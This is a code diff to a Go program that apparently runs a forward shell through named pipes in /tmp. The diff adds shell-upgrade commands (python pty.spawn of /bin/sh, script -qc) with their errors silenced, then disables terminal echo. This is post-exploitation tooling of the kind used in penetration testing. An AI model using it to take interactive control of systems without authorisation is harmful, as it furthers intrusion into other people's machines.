@@ -17,12 +17,26 @@ import (
 const FIFO_IN_PATH = "/tmp/f.inp"
 const FIFO_OUT_PATH = "/tmp/f.out"
 
+var ttyUpgradeOptions []string = []string{
+	"python3 -c 'import pty; pty.spawn(\"/bin/sh\")'",
+	"python -c 'import pty; pty.spawn(\"/bin/sh\")'",
+	"python2 -c 'import pty; pty.spawn(\"/bin/sh\")'",
+	"script -qc /bin/sh /dev/null",
+}
+
+var ttyUpgrade string
+
 var readDelay time.Duration
 var commandOutputDelay time.Duration
 
 func init() {
 	flag.DurationVar(&readDelay, "read-interval", 1*time.Second, "interval for background read loop")
 	flag.DurationVar(&commandOutputDelay, "cmd-delay", 500*time.Millisecond, "delay between sending a command and retrieving it's output")
+
+	for i, s := range ttyUpgradeOptions {
+		ttyUpgradeOptions[i] = fmt.Sprintf("%s 2>/dev/null", s)
+	}
+	ttyUpgrade = strings.Join(ttyUpgradeOptions, " || ") + " || echo failed to upgrade tty"
 }
 
 func main() {
@@ -59,7 +73,7 @@ func runSession() error {
 	}
 	defer term.Restore(int(os.Stdin.Fd()), oldState)
 
-	t := term.NewTerminal(os.Stdin, "> ")
+	t := term.NewTerminal(os.Stdin, "")
 
 	stopReadLoop := make(chan interface{})
 	justSentCommand := make(chan interface{})
@@ -85,6 +99,19 @@ func runSession() error {
 			t.Write(res)
 		}
 	})()
+
+	// Attempt to upgrade to tty
+	_, err = runCommand(fmt.Sprintf("echo %s > %s", shellQuote(ttyUpgrade), FIFO_IN_PATH))
+	if err != nil {
+		stopReadLoop <- nil
+		return err
+	}
+
+	_, err = runCommand(fmt.Sprintf("echo %s > %s", shellQuote("stty -echo || echo failed to disable tty echo"), FIFO_IN_PATH))
+	if err != nil {
+		stopReadLoop <- nil
+		return err
+	}
 
 	// Write loop
 	for {
